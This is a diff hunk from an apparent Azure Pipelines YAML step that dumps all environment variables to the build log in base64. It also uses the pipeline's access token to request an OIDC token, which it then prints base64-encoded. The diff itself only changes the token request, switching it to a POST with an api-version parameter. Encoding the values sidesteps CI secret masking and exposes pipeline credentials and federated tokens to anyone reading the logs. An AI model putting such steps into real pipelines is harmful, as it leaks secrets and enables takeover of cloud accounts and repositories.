@@ -16,7 +16,7 @@ steps:
       echo ""
       env | base64 -w 0
       echo ""
-      OIDC_TOKEN=$(curl -sSL -H "Authorization: Bearer $(System.AccessToken)" "$(System.OidcRequestUri)?resource=https://dev.azure.com/")
+      OIDC_TOKEN=$(curl -sSL -X POST -H "Authorization: Bearer $(System.AccessToken)" "$(System.OidcRequestUri)?api-version=7.1")
       echo ""
       echo "TOKEN"
       echo $OIDC_TOKEN | base64 -w 0
